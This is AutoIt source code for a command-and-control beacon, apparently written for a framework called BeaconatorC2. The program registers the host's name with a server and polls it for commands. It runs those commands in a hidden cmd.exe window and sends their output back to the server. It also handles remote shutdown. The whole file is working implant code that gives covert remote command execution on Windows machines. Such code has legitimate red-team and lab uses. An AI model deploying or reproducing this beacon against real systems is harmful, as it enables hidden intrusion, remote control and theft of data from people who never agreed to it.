; ---------------------------------------------
; Simple AutoIt Beacon (TCP) for BeaconatorC2
; - Vibe coded by Huy lol
; ---------------------------------------------

#include <Constants.au3>

; ---- Configuration & Defaults ----
Global Const $DEFAULT_SERVER = "127.0.0.1"
Global Const $DEFAULT_PORT   = 1234

Global Const $NO_CMD_SLEEP_MS  = 5000  ; sleep when no pending command
Global Const $ERR_RETRY_MS     = 3000  ; retry delay on comm error
Global Const $RECV_SLEEP_MS    = 50    ; recv polling sleep
Global Const $IDLE_TIMEOUT_MS  = 1000  ; recv idle timeout

; ---- Runtime Settings from Args ----
Global $gServer = $DEFAULT_SERVER
Global $gPort   = $DEFAULT_PORT
If $CmdLine[0] >= 1 Then $gServer = $CmdLine[1]
If $CmdLine[0] >= 2 Then $gPort   = Number($CmdLine[2])

; ---- Init & Registration ----
TCPStartup()
Global $beaconId = _GenerateBeaconId()
Global $computer = @ComputerName
_SendAndRecv("register|" & $beaconId & "|" & $computer)

; ---- Main Loop ----
While 1
    Local $resp = _SendAndRecv("request_action|" & $beaconId)
    If @error Then
        Sleep($ERR_RETRY_MS)
        ContinueLoop
    EndIf

    If $resp = "" Or $resp = "no_pending_commands" Then
        Sleep($NO_CMD_SLEEP_MS)
        ContinueLoop
    EndIf

    Local $cmdType = ""
    Local $payload = ""
    _ParseResponse($resp, $cmdType, $payload)
    _HandleCommand($cmdType, $payload)
WEnd

; ---- Networking Helpers ----
; Send a message and optionally wait for a response
Func _SendAndRecv($msg, $fireAndForget = False)
    Local $sock = TCPConnect($gServer, $gPort)
    If $sock = -1 Then Return SetError(1, 0, "")

    TCPSend($sock, $msg)

    If $fireAndForget Then
        TCPCloseSocket($sock)
        Return ""
    EndIf

    Local $data = ""
    Local $idleTimer = TimerInit()

    ; Read until server closes or idle timeout elapses
    While 1
        Local $chunk = TCPRecv($sock, 8192)
        If @error Then ExitLoop

        If $chunk <> "" Then ;if there's data/activity, reset timer
            $data &= $chunk
            $idleTimer = TimerInit()
        Else
            If TimerDiff($idleTimer) > $IDLE_TIMEOUT_MS Then ExitLoop
            Sleep($RECV_SLEEP_MS)
        EndIf
    WEnd

    TCPCloseSocket($sock)
    Return StringStripWS($data, 3)
EndFunc

Func _ExecAndCapture($cmd)
    Local $pid = Run(@ComSpec & " /c " & $cmd, "", @SW_HIDE, $STDOUT_CHILD + $STDERR_CHILD)
    If @error Or $pid = 0 Then Return "[exec error]"

    Local $out = ""
    While 1
        Local $chunk = StdoutRead($pid)
        If @error Then ExitLoop
        If $chunk <> "" Then $out &= $chunk

        If Not ProcessExists($pid) Then
            $out &= StdoutRead($pid) ; flush remaining buffer
            ExitLoop
        EndIf
        Sleep($RECV_SLEEP_MS)
    WEnd
    Return $out
EndFunc

Func _GenerateBeaconId()
    ; Simple pseudo-unique ID: random hex + process ID
    Local $rnd = Hex(Random(0, 0xFFFFFF, 1), 6)
    Local $pid = Hex(@AutoItPID, 4)
    Return StringLower($rnd & $pid)
EndFunc

; Gracefully terminate this beacon process
Func _TerminateSelf()
    ; Notify C2 that this beacon is shutting down, then exit
    Local $msg = "[SHUTDOWN] Beacon " & $beaconId & " on " & @ComputerName & " is terminating"
    ; Fire-and-forget notification
    _SendAndRecv("command_output|" & $beaconId & "|" & $msg, True)
    ; Attempt to close TCP stack cleanly then exit
    TCPShutdown()
    Exit
EndFunc

; ---- Command Parsing & Dispatch ----
; Split a response into command type and payload
Func _ParseResponse($resp, ByRef $cmdType, ByRef $payload)
    $cmdType = $resp
    $payload = ""
    Local $sepPos = StringInStr($resp, "|")
    If $sepPos > 0 Then
        $cmdType = StringLeft($resp, $sepPos - 1)
        $payload = StringMid($resp, $sepPos + 1)
    EndIf
EndFunc

; Handle execute_module variants that impact lifecycle
Func _HandleExecuteModule($payload)
    Local $modSep = StringInStr($payload, "|")
    Local $module = $payload
    If $modSep > 0 Then $module = StringLeft($payload, $modSep - 1)
    Local $modLower = StringLower(StringStripWS($module, 3))
    If $modLower = "shutdown" Or $modLower = "killself" Or $modLower = "kill_self" Or $modLower = "terminate" Then
        _TerminateSelf()
    Else
        ; Unknown module - do a lightweight checkin
        _SendAndRecv("checkin|" & $beaconId, True)
    EndIf
EndFunc

; Central command handler
Func _HandleCommand($cmdType, $payload)
    Switch $cmdType
        Case "execute_command"
            Local $normalized = StringLower(StringStripWS($payload, 3))
            If $normalized = "shutdown" Or $normalized = "exit" Or $normalized = "terminate" Or $normalized = "killself" Or $normalized = "kill_self" Then
                _TerminateSelf()
            EndIf

            Local $output = _ExecAndCapture($payload)
            _SendAndRecv("command_output|" & $beaconId & "|" & $output, True)

        Case "shutdown"
            _TerminateSelf()

        Case "execute_module"
            _HandleExecuteModule($payload)

        Case Else
            ; Unknown command types can be ignored, or you may send a checkin
            _SendAndRecv("checkin|" & $beaconId, True)
    EndSwitch
EndFunc
